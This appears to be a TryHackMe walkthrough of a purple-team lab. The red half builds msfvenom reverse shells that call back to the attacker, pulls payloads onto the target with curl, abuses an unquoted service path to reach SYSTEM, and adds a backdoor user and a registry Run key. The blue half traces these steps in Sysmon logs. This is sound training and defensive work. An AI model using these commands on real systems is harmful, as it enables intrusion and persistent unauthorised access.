---
title: Mouse Trap
date: 2024-12-12
categories: [TryHackMe, Walkthrough]
tags: [tryhackme, walkthrough, smb, sharpup, usp, run_key, evtxecmd, timeline_explorer]     # TAG names should always be lowercase
comments: false
image: /assets/img/tryhackme/walkthrough/mousetrap/banner.png
---

> Follow Jom and Terry on their purple teaming adventures, emulating attacks and investigating the leftover artefacts.

## Red : Jom and Terry Go Purple

> From initial access to persistence, we will emulate a three-stage attack on a Windows environment thanks to a special engagement.

### Attack Chain

| **Tactics** | **Techniques** | **Procedures** |
| ----------- | -------------- | -------------- |
| TA001: Initial access | Exploit Public-Facing Application (T1190) | After finding a vulnerable service, <br>you will get a user shell via remote code execution. |
| TA004: Privilege Escalation | Path Interception by Unquoted Path (T1574.009) | You will then escalate your privileges<br>through an unquoted service path. |
| TA003: Persistence | Registry Run Keys / Startup Folder (T1547.001)<br>Create Account: Local Account (T1136.001) | Finally, you will maintain persistence thanks to registry run keys<br>and local user account creation. |

### Engagement Specifications

| **Technique** | **Requirements** |
| ------------- | ---------------- |
| Remote code execution | - Once you've found the CVE and exploit, use the version<br> that uses SMB, not HTTP.<br>- Generate a **Windows stageless reverse TCP (x64) shell**.<br>- Ensure that your reverse shell is called `shell.exe`.|
| Unquoted service path | - Use `SharpUp.exe` for enumeration, located in **C:\Users\purpletom**.<br>- Target the `Mobile Mouse` directory while executing<br>the unquoted service path abuse. |
| Registry run keys and local account creation | - Use the `HKEY_CURRENT_USER` registry hive<br> - Use the `SYSTEM user` when creating the run key persistence<br>- Specify the registry key name (`shell`)<br> - Use the following path for the payload (`C:\Windows\Temp\shell.exe`)<br>- Specify the name of the backdoor user (`terry`) |

### Initial Access

Here we start with a nmap scan on the target machine :

```shell
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-30 23:18 CET
Nmap scan report for 10.10.146.39
Host is up (0.034s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE           VERSION
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-date: 2024-11-30T22:21:55+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=MOUSETRAP
| Not valid before: 2024-07-03T16:07:31
| Not valid after:  2025-01-02T16:07:31
|_ 
| rdp-ntlm-info: 
|   Target_Name: MOUSETRAP
|   NetBIOS_Domain_Name: MOUSETRAP
|   NetBIOS_Computer_Name: MOUSETRAP
|   DNS_Domain_Name: MOUSETRAP
|   DNS_Computer_Name: MOUSETRAP
|   Product_Version: 10.0.17763
|   System_Time: 2024-11-30T22:21:27+00:00
9999/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Server: Mobile Mouse Server
|     Content-Type: text/html
|     Content-Length: 326
|     <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no"></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align: center; color:green; font-weight:bold;">The server running on "MOUSETRAP" was able to receive your request.</p></BODY></HTML>
9999/tcp open  abyss?
```

We notice that the **RDP** port is open. Seeing this, I decide to launch a *rdp scanner* via **Metasploit** to identify the version but I did not do much with this information.

![rdp scan](/assets/img/tryhackme/walkthrough/mousetrap/2.png)

There is also a **NetBIOS SSN** port open but again, nothing much to see here.

However, there is also an application called *Mobile Mouse Server* listening on the port **9099**. So I open my browser to see what it is, nothing really interesting at first glance...

![web app](/assets/img/tryhackme/walkthrough/mousetrap/3.png)

...But I decide to dig deeper with this uncommon information on Google and try to find any interesting information. After a few, I stumble onto a [GitHub repo showing an exploit](https://github.com/blue0x1/mobilemouse-exploit?tab=readme-ov-file) for this vulnerability (**CVE-2023-31902**), how lucky!

There are two versions, one that uses **SMB** and the other **HTTP**. As the *engagement specifications* specify, we will use the **SMB version**.

So we craft the reverse shell using **msfvenom** :

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LOCAL LPORT=4444 -f exe -o shell.exe
```

We launch the exploit, wait with an netcat listening on the right port and...

![netcat1](/assets/img/tryhackme/walkthrough/mousetrap/4.png)

We obtain a reverse shell with the **purpletom** user and we can find the first flag in the user folder.

![first flag](/assets/img/tryhackme/walkthrough/mousetrap/5.png)

### Privilege Escalation

According to the *Attack Chain* and the *Engagement Specifications*, we will escalate our privileges through an unquoted service path. For that, there is **SharpUp** on the target machine that we can use for enumeration.

![sharpup](/assets/img/tryhackme/walkthrough/mousetrap/6.png)

We have different options but we will use the third one and target the *Mobile Mouse* directory.

![permissions](/assets/img/tryhackme/walkthrough/mousetrap/7.png)

Thanks to the `icalcs` command, we know that we have the permission to write in this directory so we create a payload using **msfvenom** (for a reverse shell again), name it *Mouse.exe* and transfer it to the target machine.

In order to transfer it, we settle a **python server** on the attack machine and use **curl** to transfer the file to the target machine.

```shell
python3 -m http.server #On the attack machine

curl http://<LOCAL_IP>:8000/Mouse.exe -o Mouse.exe #On the target machine
```

Then we move the malicious exe file called *Mouse.exe* to the correct directory and grant *Everyone* full permission on it to make sure it can be executed by the service with the command `icacls "c:\Program Files (x86)\Mobile Mouse\Mouse.exe" /grant Everyone:F`.

![mouse-exe](/assets/img/tryhackme/walkthrough/mousetrap/8.png)

![mouse-exe permissions](/assets/img/tryhackme/walkthrough/mousetrap/9.png)

Once we have our netcat listener started on our attack machine (on the right port, so for me on port **4448**), we start the service (`sc start "Mobile Mouse Service"`) and get the shell with **NT AUTHORITY\SYSTEM** access, so we can discover the second flag along with some rdp credentials.

![start service](/assets/img/tryhackme/walkthrough/mousetrap/10.png)
![ncat](/assets/img/tryhackme/walkthrough/mousetrap/11.png)
![rootflag](/assets/img/tryhackme/walkthrough/mousetrap/12.png)

### Persistence

In order to maintain persistence in the system, we will use the registry run keys and create a local user account for it.
Thanks to the privilege escalation step, we know have **SYSTEM** privileges which is required by the *Engagement Specifications* for creating the run key persistence.

We first need to create a local user named **terry** and set a password :
```shell
net user terry /add
net user terry !p4ssw0rdt3rry
```

Then, we need to transfer the reverse shell payload from the attacker machine to the target machine in `C:\Windows\Temp`. For that, I created another payload using **msfvenom** on a different port (**4450** this time).

```shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LOCAL LPORT=4450 -f exe -o shellpersistence.exe
 cd "C:\Windows\Temp"
 curl http://<LOCAL_IP>:8000/shellpersistence.exe -o shell.exe
```

After that, we can create the *Run Key* as the system user with the backdoor :

```shell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v shell /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```

Once we did that, if we launch the **checker.exe** binary in the Administrator's desktop, then we will get the last flag for this part.

![checkflag](/assets/img/tryhackme/walkthrough/mousetrap/13.png)

## Blue : Time to Catch Terry

> Now that we've finished the attack, we need to start the blue part and investigate the logs generated from the same chain attack.

In this part, we will user **Timeline Explorer** instead of **SysmonView**. As said in the guidelines, we first must extract the logs in CSV format using **evtxcmd**.

On *Powershell* in `C:\Users\Administrator\Desktop\EvtxECmd` :

```shell
.\EvtxECmd.exe -f "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx" --csv $HOME/Desktop --csvf Sysmon.csv
```

We wait a little bit and then a **CSV file** appears on the desktop :

![sysmoncsv](/assets/img/tryhackme/walkthrough/mousetrap/14.png)

Using **TimelineExplorer**, we open the file we just created and from now, we can start the analysis.

By searching the keyword **"share"** in the search bar, we can find the **name of the payload** that was shared as well as the **IP** of the attacker in the *"Payload Data4"* column.

![share](/assets/img/tryhackme/walkthrough/mousetrap/15.png)

Then, by searching the name of the payload that we just found, we are able to see the **full command-line** of the executed payload (in the *"Executable Info"* column).

We can tag this event in order to follow the timeline after the beginning of the compromission. Some lines later, we can find the command-line of the **tool** that was used for enumerating the privilege escalation and when it was executed.

With the aim of knowing what command was used to transfer the **reverse shell** binary, we can simply write the attacker's **IP** in the filters to discover it.

Once we discover this answer, it is not complicated to **follow the timeline** (which is on short term and quite stacked) to answer the rest of the questions and finish the blue part.

![start service](/assets/img/tryhackme/walkthrough/mousetrap/16.png)

![persistenceproof](/assets/img/tryhackme/walkthrough/mousetrap/17.png)